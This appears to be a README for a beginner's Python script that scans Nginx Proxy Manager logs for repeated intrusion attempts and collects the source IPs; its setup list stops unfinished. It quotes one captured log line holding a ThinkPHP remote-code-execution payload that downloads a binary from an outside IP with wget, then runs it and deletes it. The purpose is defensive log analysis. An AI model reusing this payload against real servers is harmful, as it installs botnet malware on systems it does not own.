# Update

I have found a way to filter out the IPs that send these requests and I've made a new script that does precisely that. To make it easier for anyone to run this script I've also implemented a simple menu for users to navigate trough with the ability to first parse the logs to find out any requests similar to the ones I've found and after that filter out all of this requests and it builds an list of indidual IPs that sent these requests.
It also creates all the directories it needs to work properly, and the only set up you need to do is the following:
1- 

# About this script

The idea behind this script comes from finding out a bunch of really strange requests to my Nginx Proxy Manager container that is open to the internet.
The requests in case are almost always identical to this:

`[13/Jan/2021:15:07:48 +0000] 400 - GET http localhost-nginx-proxy-manager "/index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.239.147.174/bins/MwEIrNsdFa.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp'" [Client 220.127.239.7] [Length 154] [Gzip -] "Uirusu/2.0" "-"`

The client IP is always different from what I can tell so far and the IP that it tries to wget is almost always different, trying to run that wget command will give you an "Not Authorized" response. **This script is not a solution for this issue** it just goes trough your NPM logs and finds out all the requests similar to this and puts them in a different file, I started out with a log file with 370 requests and, after running this script I got 108 requests that match the one I posted above, keep in mind that these 370 requests come from a timespan of less than 36h. And yes I am aware that NPM does not use PHP so this attempt to inject an PHP script most likely never runs ence the 400 (bad request) response from NPM, *however the authors of this could move from trying to inject PHP payloads to injecting something else that could work!*

This script reads trough your Nginx Proxy Manager logs, specially the **default.log** file stored inside your npm directory, right now you need an copy of the logs directory inside the root of this script's folder with the name of *logs*, you also need to create a directory called **parsed** so that the script can write a file with all of the requests that it looks for. It also asks for your Public IP in order to filter out your own requests to your npm server.

After running the script it will tell you how many results it got and it will also create a file that stores all of the requests it finds inside the **parsed** directory inside a file called **parsed-default.log**

Right now this scripts only does this, however I'm going to keep developing this script until it is able to extract a list of IPs from the *parsed-default.log*, besides doing this, the script will also be able to tell if the same IP tries to make this request more than once, the point of this is to see if these requests come from all over the world or just from countries known to have botnets like this running, like Iran, China and so on. So far I can say that this is not the case, because I've already found IPs from Italy and the UK that seem residential IPs but further investigation is required to reach an conclusion.

For anyone thinking that bulk blocking the IP ranges that this script find keep in mind that these IPs could also be comming from countries in the world that usually are known for not having these kinds of requests and you could possibly block people that you actually want to access your services without even knowing.

And finally a disclaimer, I am by no means a Python expert, just started to learn it less than a month ago, so it's probably going to take a while before I'm able to filter out the requests into a list of IP's. If you are willing to help me improve this script onto something that could help the NPM developers develop an fix for this feel free to contact me.
